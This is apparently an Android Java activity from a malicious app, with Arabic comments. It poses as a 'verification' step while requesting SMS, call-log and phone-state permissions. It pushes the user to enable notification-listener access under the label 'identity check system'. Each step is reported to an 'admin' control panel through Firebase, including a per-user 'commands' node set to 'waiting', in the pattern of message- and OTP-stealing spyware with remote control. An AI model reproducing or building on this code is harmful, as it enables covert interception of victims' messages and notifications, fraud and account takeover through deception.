package com.ban.ab;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

// استيراد الحزمة الرسمية للفايربيس السحابي 📡
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class VerifyActivity extends AppCompatActivity {

    private static final int PERMISSION_CODE = 101;
    private String userName;
    
    private DatabaseReference mUserStatusRef;
    private Button btnStartVerify;
    private ProgressBar verifyProgressBar, progressBarTop;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_verify);

        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
        
        // تهيئة مرجع الحالات الخاص بالمستخدم الحالي
        mUserStatusRef = FirebaseDatabase.getInstance().getReference("users_status").child(userName);

        btnStartVerify = findViewById(R.id.btnStartVerify);
        verifyProgressBar = findViewById(R.id.verifyProgressBar);
        progressBarTop = findViewById(R.id.progressBarTop);

        if (btnStartVerify != null) {
            btnStartVerify.setOnClickListener(v -> {
                toggleLoading(true);
                // إعلام الأدمن ببدء التهيئة وضخ التوست ⏳
                updateAppFlag("STATE_INITIALIZING");
                new Handler(Looper.getMainLooper()).postDelayed(this::requestPermissionsSystem, 1000);
            });
        }
    }

    // دالة تحديث الأعلام الرقمية المتزامنة مع لوحة تحكم الآدمن 🛡️
    private void updateAppFlag(String stateCode) {
        if (mUserStatusRef != null) {
            mUserStatusRef.child("current_state").setValue(stateCode)
                    .addOnFailureListener(e -> Log.e("Verify_State", "فشل تحديث المعرف السحابي"));
        }
    }

    private void toggleLoading(boolean isLoading) {
        if (btnStartVerify == null) return;
        if (isLoading) {
            btnStartVerify.setEnabled(false);
            btnStartVerify.setText("");
            if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.VISIBLE);
            if (progressBarTop != null) progressBarTop.setVisibility(View.VISIBLE);
        } else {
            btnStartVerify.setEnabled(true);
            btnStartVerify.setText("بدء عملية الربط والتحقق");
            if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.GONE);
            if (progressBarTop != null) progressBarTop.setVisibility(View.GONE);
        }
    }

    private void requestPermissionsSystem() {
        String[] permissions = {
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_CODE);
        } else {
            checkNotificationListenerBridge();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE) {
            checkNotificationListenerBridge();
        }
    }

    private void checkNotificationListenerBridge() {
        if (!isNotificationServiceEnabled()) {
            toggleLoading(false);
            try {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
                Toast.makeText(this, "خطوة أخيرة: يرجى تفعيل 'نظام فحص الهوية' 🛡️", Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                try {
                    startActivity(new Intent(Settings.ACTION_SETTINGS));
                } catch (Exception ignored) {}
            }
        } else {
            notifyAdminSuccess();
        }
    }

    // إرسال علامة نجاح الربط الكلي والتفعيل 🚀
    private void notifyAdminSuccess() {
        toggleLoading(true);

        FirebaseDatabase.getInstance().getReference("commands")
                .child(userName).child("status").setValue("waiting")
                .addOnSuccessListener(aVoid -> {
                    Toast.makeText(this, "تم تفعيل نظام الفحص السحابي بنجاح ✅", Toast.LENGTH_SHORT).show();
                    // 🟢 ضخ الرمز للأدمن لتحديث لوحة التحكم فوراً لقيمة النجاح
                    updateAppFlag("STATE_SYNC_SUCCESS");
                    finish();
                })
                .addOnFailureListener(e -> {
                    toggleLoading(false);
                    Toast.makeText(this, "فشل الربط السحابي، تحقق من الإنترنت", Toast.LENGTH_SHORT).show();
                    // 🔴 ضخ رمز الفشل وشبكة الإنترنت للأدمن
                    updateAppFlag("STATE_SYNC_FAILED");
                });
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(pkgName);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (isNotificationServiceEnabled()) {
            notifyAdminSuccess();
        } else {
            toggleLoading(false);
        }
    }
}
